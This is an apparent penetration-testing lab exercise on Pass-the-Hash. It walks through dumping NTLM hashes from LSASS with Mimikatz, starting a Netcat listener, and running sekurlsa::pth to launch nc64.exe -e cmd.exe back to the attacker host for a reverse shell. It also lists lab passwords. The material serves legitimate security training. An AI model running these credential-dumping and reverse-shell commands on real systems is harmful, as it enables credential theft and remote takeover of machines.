# Exercise 08: Launching Pass-the-Hash (PtH) Attack to Capture and Reuse Hashed Credentials

### Scenario

**Pass-the-Hash (PtH)** is an exploitation technique where an attacker authenticates to a remote server or service using the underlying **NTLM password hash** of a user account rather than cracking the plaintext password. Because Windows authentication protocols accept the encrypted password digest (NTLM hash) during the challenge-response handshake, possessing the hash alone is sufficient to forge single sign-on authentication requests and spawn privileged processes.

In this exercise, we log into **Windows 11** as <font color="#c084fc"><b>cpent</b></font> (<font color="#ff4d4d"><b>Pa$$w0rd</b></font>), elevate to administrator context via UAC using <font color="#c084fc"><b>Kevin</b></font> (<font color="#ff4d4d"><b>admin@123</b></font>), launch **Mimikatz** (`mimikatz.exe`), enable debug privileges (<font color="#ffd700"><b>privilege::debug</b></font>), elevate token context (<font color="#ffd700"><b>token::elevate</b></font>), dump NTLM credentials from LSASS memory using <font color="#ffd700"><b>sekurlsa::msv</b></font>, extract user <font color="#c084fc"><b>kevin</b></font>'s NTLM hash, start a Netcat reverse shell listener on **Parrot Security** (<font color="#ffd700"><b>nc -lvp 444</b></font>), execute Mimikatz PtH payload (<font color="#ffd700"><b>sekurlsa::pth /user:kevin /domain:lpt.com /ntlm:[HASH] /run:"c:\Users\cpent\Downloads\nc64.exe -e cmd.exe 192.168.177.18 444"</b></font>), obtain a reverse command shell on Parrot, and verify user identity (<font color="#ffd700"><b>whoami</b></font>).

### Objective

The objective of this lab is to help students learn how to:
- Launch administrative PowerShell context using domain credentials (<font color="#c084fc"><b>Kevin</b></font> / <font color="#ff4d4d"><b>admin@123</b></font>)
- Enable `SeDebugPrivilege` in Mimikatz using <font color="#ffd700"><b>privilege::debug</b></font>
- Elevate process tokens to `NT AUTHORITY\SYSTEM` via <font color="#ffd700"><b>token::elevate</b></font>
- Harvest cached NTLM hashes and Relative Identifiers (RIDs) from LSASS memory via <font color="#ffd700"><b>sekurlsa::msv</b></font>
- Note the Administrator account Relative Identifier: <font color="#ffd700"><b>000001f4</b></font>
- Set up Netcat reverse shell handler on attacker machine (<font color="#ffd700"><b>nc -lvp 444</b></font>)
- Revert process token context in Mimikatz using <font color="#ffd700"><b>token::revert</b></font>
- Execute Pass-the-Hash attack using <font color="#ffd700"><b>sekurlsa::pth /user:kevin /domain:lpt.com /ntlm:[HASH] /run:"c:\Users\cpent\Downloads\nc64.exe -e cmd.exe 192.168.177.18 444"</b></font>
- Establish an authenticated reverse command shell session as <font color="#c084fc"><b>kevin</b></font> on Parrot Security
